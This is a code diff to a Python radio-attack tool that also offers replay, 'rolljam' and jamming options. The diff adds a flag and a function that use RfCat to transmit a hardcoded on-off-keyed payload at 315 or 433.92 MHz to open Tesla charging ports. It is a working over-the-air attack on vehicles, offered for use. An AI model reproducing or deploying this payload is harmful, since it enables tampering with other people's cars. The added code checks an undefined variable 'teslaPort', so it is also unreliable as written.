@@ -21,6 +21,7 @@ def main():
     parser.add_argument('-a', '--auto', help='Enable to automatically send captures/cap files / Use in conjunction with -rj/--rolljam to send the first signal automatically', action='store_true', required=False)
     parser.add_argument('-rpiJ', '--rpitx_jammer', help='Enable jammer with rpitx by specifying rpitx directory [ie. ~/Documents/rpitx]', required=False, type=str)
     parser.add_argument('-ysJ', '--yardstick_jammer', help='Enable jammer with an EXTRA yardstick one', required=False, action='store_true')
+    parser.add_argument('-tesla', '--tesla_port', help='Specify country to send tesla charging port signal example: US, EU/AUS', required=False, type=str)
 
     args = parser.parse_args()
     baudrate = args.baudrate
@@ -40,6 +41,12 @@ def main():
     auto = args.auto
     rpitxJ = args.rpitx_jammer
     ysJ = args.yardstick_jammer
+    country = args.tesla_port
+    
+    if teslaPort != None:
+        teslaPortOpener(country)
+        print("[*] Tesla Port should be Opened Boss ;)\n")
+        exit(0)
 
     ##some sanity check
     # no medical frequency ranges please
@@ -208,5 +215,20 @@ def formatCapture(d, signals):
         payloads.append(payload)
 
     return payloads
+
+# Credits to pickeditmate
+# - https://github.com/pickeditmate
+def teslaPortOpener(country):
+    d = RfCat(idx=0)
+    d.setMdmModulation(MOD_ASK_OOK)
+    if country == 'US':
+        d.setFreq(315000000)
+    else:
+        d.setFreq(433920000)
+    d.setMdmDRate(2500)
+    d.setAmpMode(1)
+    print("[*] Sending Payload\n")
+    d.RFxmit((b'\x15\x55\x55\x51\x59\x4C\xB5\x55\x52\xD5\x4B\x4A\xD3\x4C\xAB\x4B\x15\x94\xCB\x33\x33\x2D\x54\xB4\x56\x9A\x65\x5A\x48\xAC\xC6\x59\x99\x99\x69\xA5\xB2\xB4\xD4\x2A\xD2\x80'*5))
+    d.setModeIDLE()
 
 main()
